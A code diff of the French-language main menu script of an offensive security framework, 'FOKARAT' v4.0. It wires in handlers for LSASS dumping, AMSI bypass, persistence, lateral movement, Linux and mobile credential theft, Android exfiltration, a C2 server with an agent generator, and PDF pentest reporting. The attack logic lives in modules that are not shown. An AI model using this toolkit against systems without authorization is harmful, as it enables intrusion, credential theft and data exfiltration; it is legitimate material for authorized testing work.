@@ -1,12 +1,13 @@
 #!/usr/bin/env python3
 """
-FOKARAT v3.5.1 - Framework de cybersécurité
-Corrections de sécurité : scope appliqué partout, API sécurisée.
+FOKARAT v4.0 - Framework de cybersécurité
+Sprint 11 : Rapports PDF professionnels (Executive Summary + CVSS + Recommandations)
 """
 import os
 import sys
 import time
 import json
+import base64
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
@@ -39,6 +40,43 @@ from modules.evasion.multi_encoder import MultiEncoder
 from modules.evasion.anti_vm import AntiVMGenerator
 from modules.evasion.anti_debug import AntiDebugGenerator
 
+# Sprint 7
+from modules.post_exploitation.windows.enumeration import WindowsEnumeration
+from modules.post_exploitation.windows.lsass_dump import LSASSDump
+from modules.post_exploitation.windows.persistence import WindowsPersistence
+from modules.post_exploitation.windows.amsi_bypass import AMSIBypass
+from modules.post_exploitation.windows.lateral_movement import LateralMovement
+
+# Sprint 8
+from modules.post_exploitation.linux.enumeration import LinuxEnumeration
+from modules.post_exploitation.linux.privesc import LinuxPrivesc
+from modules.post_exploitation.linux.persistence import LinuxPersistence
+from modules.post_exploitation.linux.credentials import LinuxCredentials
+from modules.post_exploitation.linux.lateral import LinuxLateral
+
+# Sprint 9
+from modules.c2.http_c2_server import C2HTTPServer
+from modules.c2.http_c2_agent import HTTPC2Agent
+from modules.c2.pivoting import Pivoting
+from modules.c2.session_manager import session_manager
+from modules.c2.crypto_channel import C2Crypto
+
+# Sprint 10
+from modules.post_exploitation.android.enumeration import AndroidEnumeration
+from modules.post_exploitation.android.persistence import AndroidPersistence
+from modules.post_exploitation.android.credentials import AndroidCredentials
+from modules.post_exploitation.android.privesc import AndroidPrivesc
+from modules.post_exploitation.android.exfiltration import AndroidExfiltration
+from modules.post_exploitation.ios.enumeration import IOSEnumeration
+from modules.post_exploitation.ios.jailbreak import IOSJailbreak
+from modules.post_exploitation.ios.persistence import IOSPersistence
+from modules.post_exploitation.ios.credentials import IOSCredentials
+
+# Sprint 11
+from modules.reporting.pdf_generator import PDFReportGenerator, ExecutiveReport
+from modules.reporting.findings import findings_manager, Finding
+from modules.reporting.cvss import CVSS31, list_presets, from_preset
+
 
 logger = Logger()
 config = Config()
@@ -52,12 +90,14 @@ mitre = MitreMapper()
 crypto = CryptoManager()
 sandbox = Sandbox()
 
+c2_server = None
+
 
 class C:
     R = "\033[0m"; B = "\033[1m"; D = "\033[2m"
     RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"
     BLU = "\033[94m"; MAG = "\033[95m"; CYN = "\033[96m"
-    WHT = "\033[97m"; PNK = "\033[38;5;213m"
+    WHT = "\033[97m"; PNK = "\033[38;5;213m"; OR = "\033[38;5;208m"
 
 
 BANNER = f"""{C.GRN}{C.B}
@@ -68,25 +108,29 @@ BANNER = f"""{C.GRN}{C.B}
    ██║     ╚██████╔╝██║  ██╗██║  ██║██║  ██║██║  ██║   ██║
    ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   {C.R}
 {C.CYN}{C.B}              Building the future, one tool at a time.{C.R}
-{C.YEL}                    FOKARAT Framework v3.5.1{C.R}
+{C.YEL}                    FOKARAT Framework v4.0{C.R}
 """
 
 
 BOOT_SEQUENCE = [
-    ("[BOOT 01] Initialisation du noyau FOKARAT...", 0.05),
-    ("[BOOT 02] Chargement des modules payloads...", 0.05),
-    ("[BOOT 03] Chargement des listeners...", 0.05),
-    ("[BOOT 04] Chargement des modules Android...", 0.05),
-    ("[BOOT 05] Chargement des modules d'évasion...", 0.05),
-    ("[BOOT 06] Initialisation de la base de données...", 0.05),
-    ("[BOOT 07] Chargement du contrôleur éthique...", 0.05),
-    ("[BOOT 08] Validation du scope...", 0.05),
-    ("[BOOT 09] Chargement du système de plugins...", 0.05),
-    ("[BOOT 10] Chargement du mapper MITRE...", 0.05),
-    ("[BOOT 11] Initialisation du chiffrement AES...", 0.05),
-    ("[BOOT 12] Initialisation du sandbox...", 0.05),
-    ("[BOOT 13] Vérification des dépendances...", 0.10),
-    ("[BOOT 14] Système prêt.", 0.15),
+    ("[BOOT 01] Initialisation du noyau FOKARAT...", 0.04),
+    ("[BOOT 02] Chargement des payloads...", 0.04),
+    ("[BOOT 03] Chargement des listeners...", 0.04),
+    ("[BOOT 04] Chargement des modules Android...", 0.04),
+    ("[BOOT 05] Chargement des modules d'évasion...", 0.04),
+    ("[BOOT 06] Chargement post-exploitation Windows...", 0.04),
+    ("[BOOT 07] Chargement post-exploitation Linux...", 0.04),
+    ("[BOOT 08] Chargement post-exploitation Mobile...", 0.04),
+    ("[BOOT 09] Chargement des modules C2...", 0.04),
+    ("[BOOT 10] Chargement du module reporting...", 0.04),
+    ("[BOOT 11] Initialisation de la base de données...", 0.04),
+    ("[BOOT 12] Chargement du contrôleur éthique...", 0.04),
+    ("[BOOT 13] Validation du scope...", 0.04),
+    ("[BOOT 14] Chargement des plugins...", 0.04),
+    ("[BOOT 15] Chargement du mapper MITRE...", 0.04),
+    ("[BOOT 16] Initialisation crypto + sandbox...", 0.04),
+    ("[BOOT 17] Vérification des dépendances...", 0.10),
+    ("[BOOT 18] Système prêt.", 0.15),
 ]
 
 
@@ -140,7 +184,7 @@ def animated_banner():
     print()
     for line in BANNER.split("\n"):
         print(f"  {line}")
-        time.sleep(0.015)
+        time.sleep(0.012)
     print()
 
 
@@ -161,12 +205,16 @@ def show_menu():
     scope_status = f"{C.GRN}✓{C.R}" if scope_validator.active_scope else f"{C.RED}✗{C.R}"
     dry_status = f"{C.YEL}ON{C.R}" if ethics.dry_run else f"{C.D}OFF{C.R}"
     plugins_count = len(plugin_loader.plugins)
+    sessions_count = len(session_manager.sessions)
+    findings_count = len(findings_manager.findings)
 
     print(f"  {C.MAG}◆{C.R} LHOST:{C.CYN}{lhost}{C.R}  "
           f"{C.MAG}◆{C.R} LPORT:{C.CYN}{lport}{C.R}  "
           f"{C.MAG}◆{C.R} Scope:{scope_status}  "
           f"{C.MAG}◆{C.R} DRY:{dry_status}  "
-          f"{C.MAG}◆{C.R} Plugins:{C.CYN}{plugins_count}{C.R}")
+          f"{C.MAG}◆{C.R} Plugins:{C.CYN}{plugins_count}{C.R}  "
+          f"{C.MAG}◆{C.R} Sessions:{C.CYN}{sessions_count}{C.R}  "
+          f"{C.MAG}◆{C.R} Findings:{C.CYN}{findings_count}{C.R}")
     print()
     print(separator("═", 62, C.CYN))
 
@@ -176,41 +224,76 @@ def show_menu():
     print(menu_option("03", "Payload MSFVenom"))
 
     print(separator("─", 62, C.BLU))
-    print(f"  {C.B}{C.MAG}▶ LISTENERS{C.R}")
+    print(f"  {C.B}{C.MAG}▶ LISTENERS / BADUSB{C.R}")
     print(menu_option("04", "Listener ncat"))
     print(menu_option("05", "Listener Metasploit"))
     print(menu_option("06", "Arrêter les listeners", C.RED))
     print(menu_option("07", "Serveur HTTP"))
-
-    print(separator("─", 62, C.BLU))
-    print(f"  {C.B}{C.MAG}▶ BADUSB{C.R}")
-    print(menu_option("08", "Générer DuckyScript"))
+    print(menu_option("08", "DuckyScript"))
     print(menu_option("09", "Encoder .duck → .bin"))
     print(menu_option("10", "Flasher USB"))
 
     print(separator("─", 62, C.BLU))
-    print(f"  {C.B}{C.MAG}▶ ATTAQUES{C.R}")
-    print(menu_option("11", "APK Injector"))
-    print(menu_option("12", "Persistance WMI"))
-
-    print(separator("─", 62, C.BLU))
     print(f"  {C.B}{C.RED}▶ ÉVASION{C.R}")
-    print(menu_option("20", "Padding aléatoire C++"))
+    print(menu_option("20", "Padding C++"))
     print(menu_option("21", "Obfuscation Python"))
     print(menu_option("22", "Compression UPX"))
-    print(menu_option("23", "Multi-encodage MSFVenom"))
+    print(menu_option("23", "Multi-encodage"))
     print(menu_option("24", "Anti-VM"))
     print(menu_option("25", "Anti-Debug"))
 
     print(separator("─", 62, C.BLU))
-    print(f"  {C.B}{C.PNK}▶ PLUGINS{C.R}")
+    print(f"  {C.B}{C.OR}▶ POST-EXPLOITATION WINDOWS{C.R}")
+    print(menu_option("60", "Énumération"))
+    print(menu_option("61", "LSASS dump"))
+    print(menu_option("62", "Persistance (7 tech)"))
+    print(menu_option("63", "AMSI Bypass"))
+    print(menu_option("64", "Mouvement latéral"))
+
+    print(separator("─", 62, C.BLU))
+    print(f"  {C.B}{C.OR}▶ POST-EXPLOITATION LINUX{C.R}")
+    print(menu_option("70", "Énumération"))
+    print(menu_option("71", "Privesc (10 tech)"))
+    print(menu_option("72", "Persistance (6 tech)"))
+    print(menu_option("73", "Credentials"))
+    print(menu_option("74", "Mouvement latéral"))
+
+    print(separator("─", 62, C.BLU))
+    print(f"  {C.B}{C.MAG}▶ C2 (COMMAND & CONTROL){C.R}")
+    print(menu_option("80", "Démarrer serveur C2 HTTP(S)"))
+    print(menu_option("81", "Générer agent C2"))
+    print(menu_option("82", "Pivoting / Tunneling"))
+    print(menu_option("83", "Voir les sessions"))
+    print(menu_option("84", "Envoyer commande"))
+
+    print(separator("─", 62, C.BLU))
+    print(f"  {C.B}{C.PNK}▶ POST-EXPLOITATION MOBILE{C.R}")
+    print(menu_option("90", "Android : Énumération"))
+    print(menu_option("91", "Android : Persistance"))
+    print(menu_option("92", "Android : Credentials"))
+    print(menu_option("93", "Android : Privesc"))
+    print(menu_option("94", "Android : Exfiltration"))
+    print(menu_option("95", "iOS : Énumération"))
+    print(menu_option("96", "iOS : Jailbreak check"))
+    print(menu_option("97", "iOS : Persistance"))
+    print(menu_option("98", "iOS : Credentials"))
+    print(menu_option("99", "iOS : Guide jailbreak"))
+
+    print(separator("─", 62, C.BLU))
+    print(f"  {C.B}{C.GRN}▶ RAPPORTS PROFESSIONNELS{C.R}")
+    print(menu_option("100", "Ajouter un finding (vulnérabilité)"))
+    print(menu_option("101", "Lister les findings"))
+    print(menu_option("102", "Générer rapport PDF complet"))
+    print(menu_option("103", "Générer Executive Summary (Markdown)"))
+    print(menu_option("104", "Voir les presets CVSS"))
+    print(menu_option("105", "Supprimer un finding"))
+
+    print(separator("─", 62, C.BLU))
+    print(f"  {C.B}{C.PNK}▶ PLUGINS / DIVERS{C.R}")
     print(menu_option("40", f"Lister les plugins ({plugins_count})"))
     print(menu_option("41", "Exécuter un plugin"))
     print(menu_option("42", "Recharger les plugins"))
-
-    print(separator("─", 62, C.BLU))
-    print(f"  {C.B}{C.CYN}▶ RAPPORTS{C.R}")
-    print(menu_option("26", "Rapport d'opérations"))
+    print(menu_option("26", "Rapport d'opérations (legacy)"))
     print(menu_option("33", "Rapport MITRE ATT&CK"))
     print(menu_option("34", "Export MITRE Navigator"))
 
@@ -251,16 +334,28 @@ def check_dependencies():
         "g++": "C++", "x86_64-w64-mingw32-g++": "Mingw64",
         "msfvenom": "MSFVenom", "msfconsole": "MSFConsole",
         "ncat": "ncat", "apktool": "APKTool", "jarsigner": "Jarsigner",
-        "zipalign": "ZipAlign", "keytool": "KeyTool", "java": "Java",
         "upx": "UPX", "pyinstaller": "PyInstaller",
+        "adb": "ADB (S10)", "frida": "Frida (S10)",
+        "impacket-psexec": "Impacket (S7)",
+        "pypykatz": "Pypykatz (S7)",
     }
     missing = []
     for cmd, desc in deps.items():
         if which(cmd):
-            print(f"  {C.GRN}[✓]{C.R} {C.B}{cmd:<28}{C.R} {C.D}{desc}{C.R}")
+            print(f"  {C.GRN}[✓]{C.R} {C.B}{cmd:<26}{C.R} {C.D}{desc}{C.R}")
         else:
-            print(f"  {C.RED}[✗]{C.R} {C.B}{cmd:<28}{C.R} {C.D}{desc}{C.R}")
+            print(f"  {C.RED}[✗]{C.R} {C.B}{cmd:<26}{C.R} {C.D}{desc}{C.R}")
             missing.append(cmd)
+
+    print()
+    # Vérifie reportlab (Sprint 11)
+    try:
+        import reportlab
+        print(f"  {C.GRN}[✓]{C.R} {C.B}{'reportlab':<26}{C.R} {C.D}PDF (S11){C.R}")
+    except ImportError:
+        print(f"  {C.RED}[✗]{C.R} {C.B}{'reportlab':<26}{C.R} {C.D}PDF (S11) - pip install reportlab{C.R}")
+        missing.append("reportlab")
+
     print()
     if missing:
         logger.warning(f"{len(missing)} outil(s) manquant(s).")
@@ -269,166 +364,506 @@ def check_dependencies():
     input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")
 
 
-def handle_padding():
-    path = input(f"  {C.YEL}.c à protéger :{C.R} ").strip()
-    if not path or not os.path.exists(path):
-        logger.error("Fichier introuvable.")
+def _ask_target_and_confirm(name):
+    target = input(f"  {C.YEL}Cible :{C.R} ").strip()
+    if not target:
+        logger.error("Cible obligatoire."); return None
+    if not scope_validator.active_scope:
+        logger.error("Aucun scope actif. Lance [30] d'abord."); return None
+    if scope_validator.active_scope["target"] != target:
+        logger.error(f"Cible '{target}' hors scope."); return None
+    if not ethics.confirm_action(f"{name} sur {target}"):
+        return None
+    return target
+
+
+# ─── Sprint 7-10 : gestionnaires (inchangés) ──────────
+def handle_enum_windows():
+    t = _ask_target_and_confirm("Énumération Windows")
+    if not t: return
+    mode = input(f"  Mode (generate/local) [generate] : ").strip() or "generate"
+    logger.success(f"Résultat : {WindowsEnumeration().run(config, args={'target': t, 'mode': mode})}")
+
+
+def handle_lsass_dump():
+    t = _ask_target_and_confirm("LSASS Dump")
+    if not t: return
+    m = input(f"  Méthode [comsvcs] : ").strip() or "comsvcs"
+    logger.success(f"Résultat : {LSASSDump().run(config, args={'target': t, 'method': m})}")
+
+
+def handle_persistence_win():
+    t = _ask_target_and_confirm("Persistance Windows")
+    if not t: return
+    tech = input(f"  Tech [registry_run] : ").strip() or "registry_run"
+    payload = input(f"  Payload [C:\\Windows\\Temp\\p.exe] : ").strip() or "C:\\Windows\\Temp\\p.exe"
+    logger.success(f"Résultat : {WindowsPersistence().run(config, args={'target': t, 'technique': tech, 'payload': payload})}")
+
+
+def handle_amsi_bypass():
+    t = _ask_target_and_confirm("AMSI Bypass")
+    if not t: return
+    tech = input(f"  Tech [reflection] : ").strip() or "reflection"
+    logger.success(f"Résultat : {AMSIBypass().run(config, args={'target': t, 'technique': tech})}")
+
+
+def handle_lateral_win():
+    t = _ask_target_and_confirm("Mouvement latéral Windows")
+    if not t: return
+    m = input(f"  Méthode [wmiexec] : ").strip() or "wmiexec"
+    u = input(f"  User [Administrator] : ").strip() or "Administrator"
+    d = input(f"  Domain [.] : ").strip() or "."
+    p = input(f"  Password : ").strip()
+    nth = input(f"  NTLM : ").strip()
+    logger.success(f"Résultat : {LateralMovement().run(config, args={'target': t, 'method': m, 'username': u, 'password': p, 'domain': d, 'nthash': nth})}")
+
+
+def handle_enum_linux():
+    t = _ask_target_and_confirm("Énumération Linux")
+    if not t: return
+    mode = input(f"  Mode [generate] : ").strip() or "generate"
+    logger.success(f"Résultat : {LinuxEnumeration().run(config, args={'target': t, 'mode': mode})}")
+
+
+def handle_privesc_linux():
+    t = _ask_target_and_confirm("Privesc Linux")
+    if not t: return
+    tech = input(f"  Tech [all] : ").strip() or "all"
+    logger.success(f"Résultat : {LinuxPrivesc().run(config, args={'target': t, 'technique': tech})}")
+
+
+def handle_persistence_linux():
+    t = _ask_target_and_confirm("Persistance Linux")
+    if not t: return
+    tech = input(f"  Tech [cron] : ").strip() or "cron"
+    payload = input(f"  Payload [/tmp/p.sh] : ").strip() or "/tmp/p.sh"
+    logger.success(f"Résultat : {LinuxPersistence().run(config, args={'target': t, 'technique': tech, 'payload': payload})}")
+
+
+def handle_credentials_linux():
+    t = _ask_target_and_confirm("Credentials Linux")
+    if not t: return
+    cat = input(f"  Cat [all] : ").strip() or "all"
+    logger.success(f"Résultat : {LinuxCredentials().run(config, args={'target': t, 'category': cat})}")
+
+
+def handle_lateral_linux():
+    t = _ask_target_and_confirm("Mouvement latéral Linux")
+    if not t: return
+    m = input(f"  Méthode [ssh] : ").strip() or "ssh"
+    u = input(f"  User [root] : ").strip() or "root"
+    logger.success(f"Résultat : {LinuxLateral().run(config, args={'target': t, 'method': m, 'username': u})}")
+
+
+def handle_c2_start():
+    global c2_server
+    if c2_server and c2_server.running:
+        logger.info("Serveur C2 déjà actif."); return
+    port = input(f"  Port [8443] : ").strip() or "8443"
+    try: port = int(port)
+    except: port = 8443
+    c2_server = C2HTTPServer(host="0.0.0.0", port=port)
+    try:
+        c2_server.start()
+        sk = base64.b64encode(c2_server.session_key).decode()
+        print(f"\n  {C.GRN}Session key : {C.CYN}{sk}{C.R}\n")
+    except OSError as e:
+        logger.error(f"Erreur : {e}")
+
+
+def handle_c2_agent():
+    global c2_server
+    if not c2_server or not c2_server.running:
+        logger.error("Démarre [80] d'abord."); return
+    sk = base64.b64encode(c2_server.session_key).decode()
+    t = _ask_target_and_confirm("Agent C2")
+    if not t: return
+    at = input(f"  Type [python] : ").strip() or "python"
+    lhost = input(f"  LHOST [{config.get('lhost')}] : ").strip() or config.get("lhost")
+    logger.success(f"Résultat : {HTTPC2Agent().run(config, args={'target': t, 'lhost': lhost, 'lport': c2_server.port, 'session_key': sk, 'agent_type': at})}")
+
+
+def handle_c2_pivot():
+    t = _ask_target_and_confirm("Pivoting")
+    if not t: return
+    m = input(f"  Méthode [ssh_socks] : ").strip() or "ssh_socks"
+    logger.success(f"Résultat : {Pivoting().run(config, args={'target': t, 'method': m})}")
+
+
+def handle_c2_sessions():
+    clear()
+    print(f"\n  {C.B}{C.MAG}═══ SESSIONS C2 ═══{C.R}\n")
+    sessions = session_manager.list_sessions()
+    if not sessions:
+        logger.info("Aucune session."); return
+    for s in sessions:
+        alive = f"{C.GRN}●{C.R}" if s['alive'] else f"{C.RED}○{C.R}"
+        print(f"  {alive} {C.CYN}{s['id']:<15}{C.R} {s['hostname']:<18} {s['username']}")
+
+
+def handle_c2_send_command():
+    sessions = session_manager.list_sessions()
+    if not sessions:
+        logger.error("Aucune session."); return
+    for i, s in enumerate(sessions, 1): print(f"    [{i}] {s['id']} - {s['hostname']}")
+    try:
+        c = int(input(f"  Session : ").strip())
+        s = sessions[c - 1]
+    except (ValueError, IndexError):
+        logger.error("Invalide."); return
+    cmd = input(f"  Commande : ").strip()
+    if cmd and c2_server:
+        c2_server.queue_command(s["id"], cmd)
+        logger.success(f"Envoyé : {cmd}")
+
+
+def handle_android_enum():
+    t = _ask_target_and_confirm("Énumération Android")
+    if not t: return
+    logger.success(f"Résultat : {AndroidEnumeration().run(config, args={'target': t})}")
+
+
+def handle_android_persistence():
+    t = _ask_target_and_confirm("Persistance Android")
+    if not t: return
+    tech = input(f"  Tech [boot_receiver] : ").strip() or "boot_receiver"
+    logger.success(f"Résultat : {AndroidPersistence().run(config, args={'target': t, 'technique': tech})}")
+
+
+def handle_android_credentials():
+    t = _ask_target_and_confirm("Credentials Android")
+    if not t: return
+    cat = input(f"  Cat [all] : ").strip() or "all"
+    logger.success(f"Résultat : {AndroidCredentials().run(config, args={'target': t, 'category': cat})}")
+
+
+def handle_android_privesc():
+    t = _ask_target_and_confirm("Privesc Android")
+    if not t: return
+    tech = input(f"  Tech [root_check] : ").strip() or "root_check"
+    logger.success(f"Résultat : {AndroidPrivesc().run(config, args={'target': t, 'technique': tech})}")
+
+
+def handle_android_exfil():
+    t = _ask_target_and_confirm("Exfiltration Android")
+    if not t: return
+    m = input(f"  Méthode [http] : ").strip() or "http"
+    ep = input(f"  Endpoint : ").strip()
+    fp = input(f"  Fichier [/sdcard/data.zip] : ").strip() or "/sdcard/data.zip"
+    logger.success(f"Résultat : {AndroidExfiltration().run(config, args={'target': t, 'method': m, 'endpoint': ep, 'file': fp})}")
+
+
+def handle_ios_enum():
+    t = _ask_target_and_confirm("Énumération iOS")
+    if not t: return
+    logger.success(f"Résultat : {IOSEnumeration().run(config, args={'target': t})}")
+
+
+def handle_ios_jailbreak_check():
+    t = _ask_target_and_confirm("Jailbreak iOS")
+    if not t: return
+    a = input(f"  Action (check/guide) [check] : ").strip() or "check"
+    result = IOSJailbreak().run(config, args={'target': t, 'action': a})
+    if a == "guide":
+        for k, v in result.get("jailbreaks", {}).items():
+            print(f"    [{k}] {v['name']} — {v['versions']} ({v['hardware']})")
+    else:
+        logger.success(f"Résultat : {result}")
+
+
+def handle_ios_persistence():
+    t = _ask_target_and_confirm("Persistance iOS")
+    if not t: return
+    tech = input(f"  Tech [launchdaemon] : ").strip() or "launchdaemon"
+    payload = input(f"  Payload [/var/mobile/p] : ").strip() or "/var/mobile/p"
+    logger.success(f"Résultat : {IOSPersistence().run(config, args={'target': t, 'technique': tech, 'payload': payload})}")
+
+
+def handle_ios_credentials():
+    t = _ask_target_and_confirm("Credentials iOS")
+    if not t: return
+    cat = input(f"  Cat [all] : ").strip() or "all"
+    logger.success(f"Résultat : {IOSCredentials().run(config, args={'target': t, 'category': cat})}")
+
+
+def handle_ios_jailbreak_guide():
+    t = _ask_target_and_confirm("Guide jailbreak iOS")
+    if not t: return
+    result = IOSJailbreak().run(config, args={'target': t, 'action': 'guide'})
+    print(f"\n  {C.B}{C.PNK}Guide Jailbreak iOS{C.R}\n")
+    for k, v in result.get("jailbreaks", {}).items():
+        print(f"  {C.CYN}[{k}]{C.R} {C.B}{v['name']}{C.R}")
+        print(f"      Versions : {v['versions']}")
+        print(f"      Matériel : {v['hardware']}")
+        print(f"      Méthode  : {v['method']}\n")
+
+
+# ─── Sprint 11 : Reporting ────────────────────────────
+def handle_add_finding():
+    clear()
+    print(f"\n  {C.B}{C.GRN}═══ AJOUTER UN FINDING ═══{C.R}\n")
+
+    title = input(f"  {C.YEL}Titre :{C.R} ").strip()
+    if not title:
+        logger.error("Titre obligatoire."); return
+
+    target = input(f"  {C.YEL}Cible :{C.R} ").strip()
+    category = input(f"  {C.YEL}Catégorie (web/network/mobile/...) [generic] :{C.R} ").strip() or "generic"
+
+    print(f"\n  {C.YEL}Presets CVSS disponibles :{C.R}")
+    presets = list_presets()
+    for i, p in enumerate(presets, 1):
+        print(f"    [{i}] {p['id']:<24} CVSS {p['score']:<4} ({p['severity']})")
+    print(f"    [0] Saisie manuelle")
+
+    choice = input(f"\n  {C.YEL}Choix du preset [1] :{C.R} ").strip() or "1"
+
+    cvss_preset = None
+    cvss_custom = None
+    severity = None
+
+    if choice == "0":
+        print(f"\n  {C.YEL}Métriques CVSS v3.1 :{C.R}")
+        av = input(f"  AV (N/A/L/P) [N] : ").strip().upper() or "N"
+        ac = input(f"  AC (L/H) [L] : ").strip().upper() or "L"
+        pr = input(f"  PR (N/L/H) [N] : ").strip().upper() or "N"
+        ui = input(f"  UI (N/R) [N] : ").strip().upper() or "N"
+        s = input(f"  Scope (U/C) [U] : ").strip().upper() or "U"
+        c = input(f"  C (N/L/H) [H] : ").strip().upper() or "H"
+        i_ = input(f"  I (N/L/H) [H] : ").strip().upper() or "H"
+        a = input(f"  A (N/L/H) [H] : ").strip().upper() or "H"
+        cvss_custom = {"av": av, "ac": ac, "pr": pr, "ui": ui, "s": s, "c": c, "i": i_, "a": a}
+    else:
+        try:
+            idx = int(choice) - 1
+            cvss_preset = presets[idx]["id"]
+        except (ValueError, IndexError):
+            cvss_preset = "misconfig"
+
+    description = input(f"\n  {C.YEL}Description :{C.R} ").strip()
+    evidence = input(f"  {C.YEL}Preuve (extrait) :{C.R} ").strip()
+    remediation = input(f"  {C.YEL}Recommandation :{C.R} ").strip()
+    mitre = input(f"  {C.YEL}Technique MITRE [optionnel] :{C.R} ").strip() or None
+
+    finding = Finding(
+        title=title,
+        description=description,
+        evidence=evidence,
+        remediation=remediation,
+        mitre_technique=mitre,
+        target=target,
+        category=category,
+        cvss_preset=cvss_preset,
+        cvss_custom=cvss_custom,
+        severity=severity,
+    )
+    findings_manager.add(finding)
+
+    print(f"\n  {C.GRN}Finding ajouté :{C.R}")
+    print(f"    ID       : {finding.id}")
+    print(f"    Sévérité : {finding.severity}")
+    print(f"    Score    : {finding.score}/10")
+    print(f"    Vecteur  : {finding.cvss.vector()}\n")
+    ethics.audit("FINDING_ADDED", f"{finding.id}: {title}")
+
+
+def handle_list_findings():
+    clear()
+    print(f"\n  {C.B}{C.GRN}═══ FINDINGS ═══{C.R}\n")
+    findings = findings_manager.list_all()
+    if not findings:
+        logger.info("Aucun finding enregistré."); return
+
+    stats = findings_manager.stats()
+    print(f"  {C.D}Total : {stats['total']} | CVSS moyen : {stats['average_score']}{C.R}")
+    print(f"  {C.RED}Critical : {stats['critical']}{C.R} | "
+          f"{C.OR}High : {stats['high']}{C.R} | "
+          f"{C.YEL}Medium : {stats['medium']}{C.R} | "
+          f"{C.GRN}Low : {stats['low']}{C.R}\n")
+
+    # Trié par score
+    sorted_findings = sorted(findings, key=lambda x: x["score"], reverse=True)
+    for f in sorted_findings:
+        sev_color = {
+            "CRITICAL": C.RED, "HIGH": C.OR, "MEDIUM": C.YEL,
+            "LOW": C.GRN, "NONE": C.D,
+        }.get(f["severity"], C.WHT)
+        print(f"  {sev_color}[{f['severity']:<8}]{C.R} "
+              f"{C.CYN}{f['id']}{C.R}  CVSS {f['score']:<4}  "
+              f"{C.B}{f['title']}{C.R}")
+        print(f"             Cible : {f['target'] or 'N/A'}  |  Catégorie : {f['category']}\n")
+
+
+def handle_generate_pdf():
+    clear()
+    print(f"\n  {C.B}{C.GRN}═══ GÉNÉRER RAPPORT PDF ═══{C.R}\n")
+
+    if not findings_manager.findings:
+        logger.warning("Aucun finding. Ajoute-en d'abord avec [100].")
         return
-    with open(path, encoding="utf-8") as f:
-        code = f.read()
-    out = path.replace(".c", "_protected.c")
-    with open(out, "w", encoding="utf-8") as f:
-        f.write(PaddingGenerator().wrap_payload(code, 8, 15))
-    logger.success(f"Protégé : {out}")
-    ethics.audit("PADDING_APPLIED", out)
+
+    client = input(f"  {C.YEL}Nom du client [Client] :{C.R} ").strip() or "Client"
+    assessor = input(f"  {C.YEL}Auditeur [FOKAS] :{C.R} ").strip() or "FOKAS"
+    scope = input(f"  {C.YEL}Scope [{scope_validator.active_scope['target'] if scope_validator.active_scope else 'N/A'}] :{C.R} ").strip()
+
+    if not scope and scope_validator.active_scope:
+        scope = scope_validator.active_scope["target"]
+
+    output = input(f"  {C.YEL}Fichier de sortie [output/fokarat_report.pdf] :{C.R} ").strip() or "output/fokarat_report.pdf"
+
+    spinner(0.5, "Génération du PDF")
+    gen = PDFReportGenerator(client_name=client, assessor=assessor, scope=scope)
+    path = gen.generate(output_path=output)
+
+    print(f"\n  {C.GRN}Rapport généré : {path}{C.R}\n")
+    ethics.audit("PDF_REPORT_GENERATED", path)
+
+
+def handle_generate_exec_summary():
+    clear()
+    print(f"\n  {C.B}{C.GRN}═══ EXECUTIVE SUMMARY ═══{C.R}\n")
+
+    if not findings_manager.findings:
+        logger.warning("Aucun finding."); return
+
+    client = input(f"  {C.YEL}Nom du client [Client] :{C.R} ").strip() or "Client"
+    assessor = input(f"  {C.YEL}Auditeur [FOKAS] :{C.R} ").strip() or "FOKAS"
+    output = input(f"  {C.YEL}Sortie [output/executive_summary.md] :{C.R} ").strip() or "output/executive_summary.md"
+
+    spinner(0.3, "Génération")
+    path = ExecutiveReport(client_name=client, assessor=assessor).generate_markdown(output)
+    print(f"\n  {C.GRN}Executive summary : {path}{C.R}\n")
+    ethics.audit("EXEC_SUMMARY_GENERATED", path)
+
+
+def handle_list_cvss_presets():
+    clear()
+    print(f"\n  {C.B}{C.GRN}═══ PRESETS CVSS v3.1 ═══{C.R}\n")
+    for p in list_presets():
+        sev_color = {
+            "CRITICAL": C.RED, "HIGH": C.OR, "MEDIUM": C.YEL,
+            "LOW": C.GRN, "NONE": C.D,
+        }.get(p["severity"], C.WHT)
+        print(f"  {C.CYN}{p['id']:<24}{C.R} "
+              f"{sev_color}{p['score']:<4} ({p['severity']:<8}){C.R}  "
+              f"{C.D}{p['vector']}{C.R}")
+
+
+def handle_remove_finding():
+    findings = findings_manager.list_all()
+    if not findings:
+        logger.info("Aucun finding."); return
+
+    for i, f in enumerate(findings, 1):
+        print(f"    [{i}] {f['id']} — [{f['severity']}] {f['title']}")
+
+    try:
+        c = int(input(f"  {C.YEL}Supprimer [#] :{C.R} ").strip())
+        finding = findings[c - 1]
+    except (ValueError, IndexError):
+        logger.error("Invalide."); return
+
+    if findings_manager.remove(finding["id"]):
+        logger.success(f"Finding supprimé : {finding['id']}")
+        ethics.audit("FINDING_REMOVED", finding["id"])
+
+
+# ─── Gestionnaires existants ──────────────────────────
+def handle_padding():
+    path = input(f"  .c : ").strip()
+    if path and os.path.exists(path):
+        with open(path) as f: code = f.read()
+        out = path.replace(".c", "_protected.c")
+        with open(out, "w") as f: f.write(PaddingGenerator().wrap_payload(code, 8, 15))
+        logger.success(f"Protégé : {out}")
 
 
 def handle_python_obfuscation():
-    path = input(f"  {C.YEL}.py à obfusquer :{C.R} ").strip()
-    if not path or not os.path.exists(path):
-        logger.error("Fichier introuvable.")
-        return
-    with open(path, encoding="utf-8") as f:
-        code = f.read()
-    out = path.replace(".py", "_obf.py")
-    with open(out, "w", encoding="utf-8") as f:
-        f.write(PythonObfuscator().obfuscate(code))
-    logger.success(f"Obfusqué : {out}")
-    ethics.audit("PYTHON_OBFUSCATED", out)
+    path = input(f"  .py : ").strip()
+    if path and os.path.exists(path):
+        with open(path) as f: code = f.read()
+        out = path.replace(".py", "_obf.py")
+        with open(out, "w") as f: f.write(PythonObfuscator().obfuscate(code))
+        logger.success(f"Obfusqué : {out}")
 
 
 def handle_upx():
-    path = input(f"  {C.YEL}Binaire :{C.R} ").strip()
-    if not path or not os.path.exists(path):
-        logger.error("Introuvable.")
-        return
-    UPXPacker().pack(path, True)
-    ethics.audit("UPX_PACKED", path)
+    path = input(f"  Binaire : ").strip()
+    if path and os.path.exists(path): UPXPacker().pack(path, True)
 
 
 def handle_multi_encoder():
     MultiEncoder().list_encoders()
